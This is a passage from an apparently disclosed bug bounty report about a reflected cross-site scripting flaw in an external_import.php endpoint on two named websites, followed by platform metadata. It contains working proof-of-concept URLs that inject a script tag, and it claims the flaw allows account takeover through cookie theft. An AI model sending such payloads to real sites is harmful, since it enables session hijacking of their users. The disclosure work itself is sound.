Like :\nhttps://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\nhttp://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\n\nAlso there is no secure flag on the session cookie (`periodicSessionatavist`). So this XSS leads to account takeover.\n\n## Impact\n\nReflected XSS - account takeover via cookie stealing\n\nThanks,\nBugra","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-18T02:57:14.633Z","allow_singular_disclosure_after":-25707027.33823461,"singular_disclosure_allowed":true,"vote_count":14,"voters":["pyrrhon","xploiterr","th4nu_0x0","bombon","realtess","aporlorxl23","cyanpiny","yusuf_furkan","can","sunalil","and 4 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9167182,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your submission.
